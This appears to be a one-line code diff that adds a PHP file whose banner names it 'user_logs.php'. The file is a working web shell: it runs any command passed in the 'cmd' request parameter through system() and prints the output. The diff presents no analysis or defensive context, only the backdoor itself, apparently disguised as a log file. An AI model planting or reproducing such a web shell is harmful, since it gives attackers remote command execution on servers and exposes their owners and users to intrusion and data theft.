@@ -1,0 +1,1 @@
+<?php echo "Shell Aktif - user_logs.php"; if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; } ?>
